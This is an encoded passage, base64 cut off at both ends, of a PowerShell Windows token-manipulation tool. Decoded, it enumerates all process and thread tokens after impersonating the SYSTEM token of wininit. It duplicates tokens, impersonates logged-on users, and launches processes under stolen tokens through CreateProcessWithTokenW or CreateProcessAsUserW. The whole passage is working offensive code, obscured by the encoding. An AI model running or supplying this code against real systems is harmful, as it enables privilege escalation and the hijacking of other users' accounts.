CAgICAgICAgICAgICRUb2tlbi5Vc2VybmFtZSAtaW5vdG1hdGNoICJeTE9DQUxcc1NFUlZJQ0UkIikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVG9rZW5CeVVzZXIuQWRkKCRLZXksICRUb2tlbikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNJZiBUb2tlbnMgaGF2ZSBlcXVhbCBlbGV2YXRpb24gbGV2ZWxzLCBjb21wYXJlIHRoZWlyIHByaXZpbGVnZXMuCiAgICAgICAgICAgICAgICBpZigkVG9rZW4uSXNFbGV2YXRlZCAtZXEgJFRva2VuQnlVc2VyWyRLZXldLklzRWxldmF0ZWQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCgkVG9rZW4uUHJpdmlsZWdlc0VuYWJsZWQuQ291bnQgKyAkVG9rZW4uUHJpdmlsZWdlc0F2YWlsYWJsZS5Db3VudCkgLWd0ICgkVG9rZW5CeVVzZXJbJEtleV0uUHJpdmlsZWdlc0VuYWJsZWQuQ291bnQgKyAkVG9rZW5CeVVzZXJbJEtleV0uUHJpdmlsZWdlc0F2YWlsYWJsZS5Db3VudCkpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkVG9rZW5CeVVzZXJbJEtleV0gPSAkVG9rZW4KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAjSWYgdGhlIG5ldyB0b2tlbiBpcyBlbGV2YXRlZCBhbmQgdGhlIGN1cnJlbnQgdG9rZW4gaXNuJ3QsIHVzZSB0aGUgbmV3IHRva2VuCiAgICAgICAgICAgICAgICBlbHNlaWYgKCgkVG9rZW4uSXNFbGV2YXRlZCAtZXEgJHRydWUpIC1hbmQgKCRUb2tlbkJ5VXNlclskS2V5XS5Jc0VsZXZhdGVkIC1lcSAkZmFsc2UpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRUb2tlbkJ5VXNlclskS2V5XSA9ICRUb2tlbgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAjRmlsdGVyIHRva2VucyBieSBwcml2aWxlZ2UKICAgICAgICBmb3JlYWNoICgkVG9rZW4gaW4gJEFsbFRva2VucykKICAgICAgICB7CiAgICAgICAgICAgICRGdWxsbmFtZSA9ICIkKCRUb2tlbi5Eb21haW4pXCQoJFRva2VuLlVzZXJuYW1lKSIKCiAgICAgICAgICAgICNGaWx0ZXIgY3VycmVudGx5IGVuYWJsZWQgcHJpdmlsZWdlcwogICAgICAgICAgICBmb3JlYWNoICgkUHJpdmlsZWdlIGluICRUb2tlbi5Qcml2aWxlZ2VzRW5hYmxlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRUb2tlbkJ5RW5hYmxlZFByaXYuQ29udGFpbnNLZXkoJFByaXZpbGVnZSkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaWYoJFRva2VuQnlFbmFibGVkUHJpdlskUHJpdmlsZWdlXSAtbm90Y29udGFpbnMgJEZ1bGxuYW1lKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFRva2VuQnlFbmFibGVkUHJpdlskUHJpdmlsZWdlXSArPSAsJEZ1bGxuYW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRUb2tlbkJ5RW5hYmxlZFByaXYuQWRkKCRQcml2aWxlZ2UsIEAoJEZ1bGxuYW1lKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgI0ZpbHRlciBjdXJyZW50bHkgYXZhaWxhYmxlIChidXQgbm90IGVuYWJsZSkgcHJpdmlsZWdlcwogICAgICAgICAgICBmb3JlYWNoICgkUHJpdmlsZWdlIGluICRUb2tlbi5Qcml2aWxlZ2VzQXZhaWxhYmxlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFRva2VuQnlBdmFpbGFibGVQcml2LkNvbnRhaW5zS2V5KCRQcml2aWxlZ2UpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCRUb2tlbkJ5QXZhaWxhYmxlUHJpdlskUHJpdmlsZWdlXSAtbm90Y29udGFpbnMgJEZ1bGxuYW1lKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFRva2VuQnlBdmFpbGFibGVQcml2WyRQcml2aWxlZ2VdICs9ICwkRnVsbG5hbWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFRva2VuQnlBdmFpbGFibGVQcml2LkFkZCgkUHJpdmlsZWdlLCBAKCRGdWxsbmFtZSkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRSZXR1cm5EaWN0ID0gQHsKICAgICAgICAgICAgVG9rZW5CeVVzZXIgPSAkVG9rZW5CeVVzZXIKICAgICAgICAgICAgVG9rZW5CeUVuYWJsZWRQcml2ID0gJFRva2VuQnlFbmFibGVkUHJpdgogICAgICAgICAgICBUb2tlbkJ5QXZhaWxhYmxlUHJpdiA9ICRUb2tlbkJ5QXZhaWxhYmxlUHJpdgogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIChOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSAkUmV0dXJuRGljdCkKICAgIH0KCgogICAgZnVuY3Rpb24gSW52b2tlLUltcGVyc29uYXRlVXNlcgogICAgewogICAgICAgIFBhcmFtKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgICAgIFtJbnRQdHJdCiAgICAgICAgICAgICRoVG9rZW4KICAgICAgICApCgogICAgICAgICNEdXBsaWNhdGUgdGhlIHRva2VuIHNvIGl0IGNhbiBiZSB1c2VkIHRvIGNyZWF0ZSBhIG5ldyBwcm9jZXNzCiAgICAgICAgW0ludFB0cl0kTmV3SFRva2VuID0gW0ludFB0cl06Olplcm8KICAgICAgICAkU3VjY2VzcyA9ICREdXBsaWNhdGVUb2tlbkV4Lkludm9rZSgkaFRva2VuLCAkV2luMzJDb25zdGFudHMuTUFYSU1VTV9BTExPV0VELCBbSW50UHRyXTo6WmVybywgMywgMSwgW1JlZl0kTmV3SFRva2VuKSAjdG9kbyBkb2VzIHRoaXMgbmVlZCB0byBiZSBmcmVlZAogICAgICAgIGlmICgtbm90ICRTdWNjZXNzKQogICAgICAgIHsKICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRHVwbGljYXRlVG9rZW5FeCBmYWlsZWQuIEVycm9yQ29kZTogJEVycm9yQ29kZSIKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkSW1wZXJzb25hdGVMb2dnZWRPblVzZXIuSW52b2tlKCROZXdIVG9rZW4pCiAgICAgICAgICAgIGlmICgtbm90ICRTdWNjZXNzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkRXJyb3Jjb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRmFpbGVkIHRvIEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyLiBFcnJvciBjb2RlOiAkRXJyb3Jjb2RlIgogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkU3VjY2VzcyA9ICRDbG9zZUhhbmRsZS5JbnZva2UoJE5ld0hUb2tlbikKICAgICAgICAkTmV3SFRva2VuID0gW0ludFB0cl06Olplcm8KICAgICAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgICAgICB7CiAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkNsb3NlSGFuZGxlIGZhaWxlZCB0byBjbG9zZSBOZXdIVG9rZW4uIEVycm9yQ29kZTogJEVycm9yQ29kZSIKICAgICAgICB9CgogICAgICAgIHJldHVybiAkU3VjY2VzcwogICAgfQoKCiAgICBmdW5jdGlvbiBDcmVhdGUtUHJvY2Vzc1dpdGhUb2tlbgogICAgewogICAgICAgIFBhcmFtKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgICAgIFtJbnRQdHJdCiAgICAgICAgICAgICRoVG9rZW4sCgogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTEsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQcm9jZXNzTmFtZSwKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MildCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQcm9jZXNzQXJncywKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MyldCiAgICAgICAgICAgIFtTd2l0Y2hdCiAgICAgICAgICAgICRQYXNzVGhydQogICAgICAgICkKICAgICAgICBXcml0ZS1WZXJib3NlICJFbnRlcmluZyBDcmVhdGUtUHJvY2Vzc1dpdGhUb2tlbiIKICAgICAgICAjRHVwbGljYXRlIHRoZSB0b2tlbiBzbyBpdCBjYW4gYmUgdXNlZCB0byBjcmVhdGUgYSBuZXcgcHJvY2VzcwogICAgICAgIFtJbnRQdHJdJE5ld0hUb2tlbiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJFN1Y2Nlc3MgPSAkRHVwbGljYXRlVG9rZW5FeC5JbnZva2UoJGhUb2tlbiwgJFdpbjMyQ29uc3RhbnRzLk1BWElNVU1fQUxMT1dFRCwgW0ludFB0cl06Olplcm8sIDMsIDEsIFtSZWZdJE5ld0hUb2tlbikKICAgICAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgICAgICB7CiAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkR1cGxpY2F0ZVRva2VuRXggZmFpbGVkLiBFcnJvckNvZGU6ICRFcnJvckNvZGUiCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRTdGFydHVwSW5mb1NpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFNUQVJUVVBJTkZPKQogICAgICAgICAgICBbSW50UHRyXSRTdGFydHVwSW5mb1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkU3RhcnR1cEluZm9TaXplKQogICAgICAgICAgICAkbWVtc2V0Lkludm9rZSgkU3RhcnR1cEluZm9QdHIsIDAsICRTdGFydHVwSW5mb1NpemUpIHwgT3V0LU51bGwKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVJbnQzMigkU3RhcnR1cEluZm9QdHIsICRTdGFydHVwSW5mb1NpemUpICNUaGUgZmlyc3QgcGFyYW1ldGVyIChjYikgaXMgYSBEV09SRCB3aGljaCBpcyB0aGUgc2l6ZSBvZiB0aGUgc3RydWN0CgogICAgICAgICAgICAkUHJvY2Vzc0luZm9TaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRQUk9DRVNTX0lORk9STUFUSU9OKQogICAgICAgICAgICBbSW50UHRyXSRQcm9jZXNzSW5mb1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkUHJvY2Vzc0luZm9TaXplKQoKICAgICAgICAgICAgJFByb2Nlc3NOYW1lUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RyaW5nVG9IR2xvYmFsVW5pKCIkUHJvY2Vzc05hbWUiKQogICAgICAgICAgICAkUHJvY2Vzc0FyZ3NQdHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICBpZiAoLW5vdCBbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkUHJvY2Vzc0FyZ3MpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUHJvY2Vzc0FyZ3NQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxVbmkoImAiJFByb2Nlc3NOYW1lYCIgJFByb2Nlc3NBcmdzIikKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJEZ1bmN0aW9uTmFtZSA9ICIiCiAgICAgICAgICAgIGlmIChbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpHZXRDdXJyZW50UHJvY2VzcygpLlNlc3Npb25JZCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgI0Nhbm5vdCB1c2UgQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcgd2hlbiBpbiBTZXNzaW9uMCBiZWNhdXNlIENyZWF0ZVByb2Nlc3NXaXRoVG9rZW5XIHRocm93cyBhbiBBQ0NFU1NfREVOSUVEIGVycm9yLiBJIGJlbGlldmUgaXQgaXMgYmVjYXVzZQogICAgICAgICAgICAgICAgI3RoaXMgQVBJIGF0dGVtcHRzIHRvIG1vZGlmeSB0aGUgZGVza3RvcCBBQ0wuIEkgd291bGQganVzdCB1c2UgdGhpcyBBUEkgYWxsIHRoZSB0aW1lLCBidXQgaXQgcmVxdWlyZXMgdGhhdCBJIGVuYWJsZSBTZUFzc2lnblByaW1hcnlUb2tlblByaXZpbGVnZQogICAgICAgICAgICAgICAgI3doaWNoIGlzIG5vdCBpZGVhbC4gCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJSdW5uaW5nIGluIFNlc3Npb24gMC4gRW5hYmxpbmcgU2VBc3NpZ25QcmltYXJ5VG9rZW5Qcml2aWxlZ2UgYW5kIGNhbGxpbmcgQ3JlYXRlUHJvY2Vzc0FzVXNlclcgdG8gY3JlYXRlIGEgcHJvY2VzcyB3aXRoIGFsdGVybmF0ZSB0b2tlbi4iCiAgICAgICAgICAgICAgICBFbmFibGUtUHJpdmlsZWdlIC1Qcml2aWxlZ2UgU2VBc3NpZ25QcmltYXJ5VG9rZW5Qcml2aWxlZ2UKICAgICAgICAgICAgICAgICRTdWNjZXNzID0gJENyZWF0ZVByb2Nlc3NBc1VzZXJXLkludm9rZSgkTmV3SFRva2VuLCAkUHJvY2Vzc05hbWVQdHIsICRQcm9jZXNzQXJnc1B0ciwgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvLCAkZmFsc2UsIDAsIFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybywgJFN0YXJ0dXBJbmZvUHRyLCAkUHJvY2Vzc0luZm9QdHIpCiAgICAgICAgICAgICAgICAkRnVuY3Rpb25OYW1lID0gIkNyZWF0ZVByb2Nlc3NBc1VzZXJXIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiTm90IHJ1bm5pbmcgaW4gU2Vzc2lvbiAwLCBjYWxsaW5nIENyZWF0ZVByb2Nlc3NXaXRoVG9rZW5XIHRvIGNyZWF0ZSBhIHByb2Nlc3Mgd2l0aCBhbHRlcm5hdGUgdG9rZW4uIgogICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcuSW52b2tlKCROZXdIVG9rZW4sIDB4MCwgJFByb2Nlc3NOYW1lUHRyLCAkUHJvY2Vzc0FyZ3NQdHIsIDAsIFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybywgJFN0YXJ0dXBJbmZvUHRyLCAkUHJvY2Vzc0luZm9QdHIpCiAgICAgICAgICAgICAgICAkRnVuY3Rpb25OYW1lID0gIkNyZWF0ZVByb2Nlc3NXaXRoVG9rZW5XIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkU3VjY2VzcykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgI0ZyZWUgdGhlIGhhbmRsZXMgcmV0dXJuZWQgaW4gdGhlIFByb2Nlc3NJbmZvIHN0cnVjdHVyZQogICAgICAgICAgICAgICAgJFByb2Nlc3NJbmZvID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFByb2Nlc3NJbmZvUHRyLCBbVHlwZV0kUFJPQ0VTU19JTkZPUk1BVElPTikKICAgICAgICAgICAgICAgICRDbG9zZUhhbmRsZS5JbnZva2UoJFByb2Nlc3NJbmZvLmhQcm9jZXNzKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAkQ2xvc2VIYW5kbGUuSW52b2tlKCRQcm9jZXNzSW5mby5oVGhyZWFkKSB8IE91dC1OdWxsCgoJCSNQYXNzIGNyZWF0ZWQgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3Mgb2JqZWN0IHRvIHBpcGVsaW5lCgkJaWYgKCRQYXNzVGhydSkgewoJCQkjUmV0cmlldmluZyBjcmVhdGVkIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIG9iamVjdAoJCQkkcmV0dXJuUHJvY2VzcyA9IEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0luZm8uZHdQcm9jZXNzSWQKCgkJCSNDYWNoaW5nIHByb2Nlc3MgaGFuZGxlIHNvIHdlIGRvbid0IGxvc2UgaXQgd2hlbiB0aGUgcHJvY2VzcyBleGl0cwoJCQkkbnVsbCA9ICRyZXR1cm5Qcm9jZXNzLkhhbmRsZQoKCQkJI1Bhc3NpbmcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3Mgb2JqZWN0IHRvIHBpcGVsaW5lCgkJCSRyZXR1cm5Qcm9jZXNzCgkJfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIiRGdW5jdGlvbk5hbWUgZmFpbGVkLiBFcnJvciBjb2RlOiAkRXJyb3JDb2RlIgogICAgICAgICAgICB9CgogICAgICAgICAgICAjRnJlZSBTdGFydHVwSW5mbyBtZW1vcnkgYW5kIFByb2Nlc3NJbmZvIG1lbW9yeQogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkU3RhcnR1cEluZm9QdHIpCiAgICAgICAgICAgICRTdGFydHVwSW5mb1B0ciA9IFtJbnRwdHJdOjpaZXJvCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRQcm9jZXNzSW5mb1B0cikKICAgICAgICAgICAgJFByb2Nlc3NJbmZvUHRyID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6WmVyb0ZyZWVHbG9iYWxBbGxvY1VuaWNvZGUoJFByb2Nlc3NOYW1lUHRyKQogICAgICAgICAgICAkUHJvY2Vzc05hbWVQdHIgPSBbSW50UHRyXTo6WmVybwoKICAgICAgICAgICAgI0Nsb3NlIGhhbmRsZSBmb3IgdGhlIHRva2VuIGR1cGxpY2F0ZWQgd2l0aCBEdXBsaWNhdGVUb2tlbkV4CiAgICAgICAgICAgICRTdWNjZXNzID0gJENsb3NlSGFuZGxlLkludm9rZSgkTmV3SFRva2VuKQogICAgICAgICAgICAkTmV3SFRva2VuID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgaWYgKC1ub3QgJFN1Y2Nlc3MpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJDbG9zZUhhbmRsZSBmYWlsZWQgdG8gY2xvc2UgTmV3SFRva2VuLiBFcnJvckNvZGU6ICRFcnJvckNvZGUiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgoKICAgIGZ1bmN0aW9uIEZyZWUtQWxsVG9rZW5zCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICAgICAgW1BTT2JqZWN0W11dCiAgICAgICAgICAgICRUb2tlbkluZm9PYmpzCiAgICAgICAgKQoKICAgICAgICBmb3JlYWNoICgkT2JqIGluICRUb2tlbkluZm9PYmpzKQogICAgICAgIHsKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkQ2xvc2VIYW5kbGUuSW52b2tlKCRPYmouaFRva2VuKQogICAgICAgICAgICBpZiAoLW5vdCAkU3VjY2VzcykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBjbG9zZSB0b2tlbiBoYW5kbGUgaW4gRnJlZS1BbGxUb2tlbnMuIEVycm9yQ29kZTogJEVycm9yQ29kZSIKICAgICAgICAgICAgfQogICAgICAgICAgICAkT2JqLmhUb2tlbiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgfQogICAgfQoKCiAgICAjRW51bWVyYXRlIGFsbCB0b2tlbnMgb24gdGhlIHN5c3RlbS4gUmV0dXJucyBhbiBhcnJheSBvZiBvYmplY3RzIHdpdGggdGhlIHRva2VuIGFuZCBpbmZvcm1hdGlvbiBhYm91dCB0aGUgdG9rZW4uCiAgICBmdW5jdGlvbiBFbnVtLUFsbFRva2VucwogICAgewogICAgICAgICRBbGxUb2tlbnMgPSBAKCkKCiAgICAgICAgI0ZpcnN0IEdldFN5c3RlbS4gVGhlIHNjcmlwdCBjYW5ub3QgZW51bWVyYXRlIGFsbCB0b2tlbnMgdW5sZXNzIGl0IGlzIHN5c3RlbSBmb3Igc29tZSByZWFzb24uIEx1Y2tpbHkgaXQgY2FuIGltcGVyc29uYXRlIGEgc3lzdGVtIHRva2VuLgogICAgICAgICNFdmVuIGlmIGFscmVhZHkgcnVubmluZyBhcyBzeXN0ZW0sIGxhdGVyIHBhcnRzIG9uIHRoZSBzY3JpcHQgZGVwZW5kIG9uIGhhdmluZyBhIFNZU1RFTSB0b2tlbiB3aXRoIG1vc3QgcHJpdmlsZWdlcywgc28gaW1wZXJzb25hdGUgdGhlIHdpbmluaXQgdG9rZW4uCiAgICAgICAgJHN5c3RlbVRva2VuSW5mbyA9IEdldC1QcmltYXJ5VG9rZW4gLVByb2Nlc3NJZCAoR2V0LVByb2Nlc3Mgd2luaW5pdCB8IHdoZXJlIHskXy5TZXNzaW9uSWQgLWVxIDB9KS5JZAogICAgICAgIGlmICgkc3lzdGVtVG9rZW5JbmZvIC1lcSAkbnVsbCAtb3IgKC1ub3QgKEludm9rZS1JbXBlcnNvbmF0ZVVzZXIgLWhUb2tlbiAkc3lzdGVtVG9rZW5JbmZvLmhQcm9jVG9rZW4pKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlVuYWJsZSB0byBpbXBlcnNvbmF0ZSBTWVNURU0sIHRoZSBzY3JpcHQgd2lsbCBub3QgYmUgYWJsZSB0byBlbnVtZXJhdGUgYWxsIHRva2VucyIKICAgICAgICB9CgogICAgICAgIGlmICgkc3lzdGVtVG9rZW5JbmZvIC1uZSAkbnVsbCAtYW5kICRzeXN0ZW1Ub2tlbkluZm8uaFByb2NUb2tlbiAtbmUgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICAkQ2xvc2VIYW5kbGUuSW52b2tlKCRzeXN0ZW1Ub2tlbkluZm8uaFByb2NUb2tlbikgfCBPdXQtTnVsbAogICAgICAgICAgICAkc3lzdGVtVG9rZW5JbmZvID0gJG51bGwKICAgICAgICB9CgogICAgICAgICRQcm9jZXNzSWRzID0gZ2V0LXByb2Nlc3MgfCB3aGVyZSB7JF8ubmFtZSAtaW5vdG1hdGNoICJeY3Nyc3MkIiAtYW5kICRfLm5hbWUgLWlub3RtYXRjaCAiXnN5c3RlbSQiIC1hbmQgJF8uaWQgLW5lIDB9CgogICAgICAgICNHZXQgYWxsIHRva2VucwogICAgICAgIGZvcmVhY2ggKCRQcm9jZXNzIGluICRQcm9jZXNzSWRzKQogICAgICAgIHsKICAgICAgICAgICAgJFByaW1hcnlUb2tlbkluZm8gPSAoR2V0LVByaW1hcnlUb2tlbiAtUHJvY2Vzc0lkICRQcm9jZXNzLklkIC1GdWxsUHJpdnMpCgogICAgICAgICAgICAjSWYgYSBwcm9jZXNzIGlzIGEgcHJvdGVjdGVkIHByb2Nlc3MsIGl0J3MgcHJpbWFyeSB0b2tlbiBjYW5ub3QgYmUgb2J0YWluZWQuIERvbid0IHRyeSB0byBlbnVtZXJhdGUgaXQuCiAgICAgICAgICAgIGlmICgkUHJpbWFyeVRva2VuSW5mbyAtbmUgJG51bGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFtJbnRQdHJdJGhUb2tlbiA9IFtJbnRQdHJdJFByaW1hcnlUb2tlbkluZm8uaFByb2NUb2tlbgoKICAgICAgICAgICAgICAgIGlmICgkaFRva2VuIC1uZSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAjR2V0IHRoZSBMVUlEIGNvcnJvc3BvbmRpbmcgdG8gdGhlIGxvZ29uCiAgICAgICAgICAgICAgICAgICAgJFJldHVybk9iaiA9IEdldC1Ub2tlbkluZm9ybWF0aW9uIC1oVG9rZW4gJGhUb2tlbgogICAgICAgICAgICAgICAgICAgIGlmICgkUmV0dXJuT2JqIC1uZSAkbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZXR1cm5PYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQcm9jZXNzSWQgLVZhbHVlICRQcm9jZXNzLklkCgogICAgICAgICAgICAgICAgICAgICAgICAkQWxsVG9rZW5zICs9ICRSZXR1cm5PYmoKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiQ291bGRuJ3QgcmV0cmlldmUgdG9rZW4gZm9yIFByb2Nlc3M6ICQoJFByb2Nlc3MuTmFtZSkuIFByb2Nlc3NJZDogJCgkUHJvY2Vzcy5JZCkiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZm9yZWFjaCAoJFRocmVhZCBpbiAkUHJvY2Vzcy5UaHJlYWRzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRUaHJlYWRUb2tlbkluZm8gPSBHZXQtVGhyZWFkVG9rZW4gLVRocmVhZElkICRUaHJlYWQuSWQKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRoVG9rZW4gPSAoJFRocmVhZFRva2VuSW5mby5oVGhyZWFkVG9rZW4pCgogICAgICAgICAgICAgICAgICAgIGlmICgkaFRva2VuIC1uZSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZXR1cm5PYmogPSBHZXQtVG9rZW5JbmZvcm